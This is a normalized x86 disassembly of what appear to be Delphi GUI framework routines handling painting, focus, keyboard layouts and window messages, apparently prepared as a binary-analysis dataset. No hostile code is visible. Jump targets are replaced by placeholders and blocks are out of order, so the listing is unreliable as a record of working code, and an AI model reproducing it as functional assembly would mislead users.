xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_4406bc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44004c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4406dc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_44004c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_440750
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44004c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_440770
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44004c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_440790
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44004c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4407b4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44004c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4407d8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44004c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4407fc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44004c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_440820
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_42bf68
mov edi eax
mov eax edi
call sub_42c048
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_41ccc4
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4423cc
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_42c148
jmp r-xdata
sub_4408a8
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_43d6cc
test bl bl
je r-xdata
mov eax edi
call sub_4426dc
mov eax edi
call sub_4422d4
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_4422d4
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_440968
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_43d328
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_4409b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4426dc
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_43ec8c
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_403420
sub_440a00
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_43b710
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_43fcb8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b1a4
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45968c
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_440b50
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_440c2f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440c36
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_4423cc
mov dl [ ebx + 0x184 ]
call sub_44700c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_459604
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407bbc
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_459404
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_459404
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_459404
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_440c3c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_440cc6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440ccd
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_459604
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407bbc
test eax eax
je r-xdata
mov eax ebx
call sub_4423cc
mov dl 0x1
call sub_446ff0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_440d28
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_4124d4
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_43cd98
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_440d78
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_440dac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_403420
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_403420
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_440dec
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_43cd98
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_440e44
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4198f8
mov edx [ r-xdata ]
call sub_4033d4
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_440e7c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_413918
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_440ea0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_4423cc
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_440efc
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_440e68
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_413918
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_440f3c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_4055b0
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_4055b0
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_440fa8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_441050
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441057
lea eax [ ebp - 0x4 ]
call sub_405598
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_439878
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_403224
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_405598
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_403420
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_4055b0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ edi + 0x178 ] eax
sub_441060
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_43ec64
xor edx edx
push ebp
push sub_441122
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_403420
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441129
mov eax [ ebp - 0x4 ]
call sub_43ec6c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_441129
mov eax [ ebp - 0x4 ]
call sub_452980
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_43be2c
sub_441174
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_40316c
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43da58
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_4411de
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_403420
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_43be2c
sub_4411f8
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_441220
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_452980
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_452888
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_403420
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_441220
test al al
jne r-xdata
sub_441288
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441220
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_443518
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4412b4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441220
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_443518
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4412e0
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_441308
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_452980
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_452888
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_403420
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_441308
test al al
jne r-xdata
sub_441370
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441308
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441390
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441308
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4413d0
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_452980
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_403420
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_4413d0
test al al
jne r-xdata
sub_441434
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4413d0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441454
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43f0fc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43f0c0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_43cd98
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_441454
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_441504
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_441454
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_452980
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_43cd98
test eax eax
jne r-xdata
sub_4415ac
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44004c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4415cc
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44004c
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441600
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44004c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441620
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_441670
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_441694
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_43ae98
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_43f0fc
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_43f0c0
mov dl [ esp ]
mov si 0xffd1
call sub_403420
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_4416ec
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_403420
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_441710
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_403420
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_441748
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43d86c
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_43f15c
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_43f96c
sub_441780
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_403420
pop esi
pop ebx
retn
mov eax ebx
call sub_43c228
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_40441c
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_40441c
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_441800
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43fd4c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43d940
sub_441860
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_43fac0
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_43eebc
pop ebx
retn
sub_441890
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_4418b8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_4426d0
test al al
je r-xdata
